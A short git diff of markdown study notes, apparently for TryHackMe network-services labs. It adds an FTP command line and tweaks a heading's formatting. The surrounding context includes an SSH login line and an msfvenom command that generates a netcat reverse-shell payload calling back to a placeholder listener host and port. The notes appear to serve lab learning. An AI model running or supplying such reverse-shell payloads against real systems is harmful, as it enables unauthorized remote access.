@@ -34,6 +34,9 @@ SSH Commands:
 ssh username@IP
 ```
 FTP Commands:
+```
+ftp[ip]
+```
 
 References:\
 [Try Hack Me Network Services room](https://tryhackme.com/r/room/networkservices)
@@ -43,7 +46,7 @@ References:\
 Reverse Shell:\
 Obtain your lhost from the terminal using ifconfig or ip a
 
-Obtaining a reverse shell payload:\
+Obtaining a reverse shell payload:
 ```zsh
 msfvenom -p cmd/unix/reverse_netcat lhost=xx.xx.xx.xx lport=4444 R
 ```
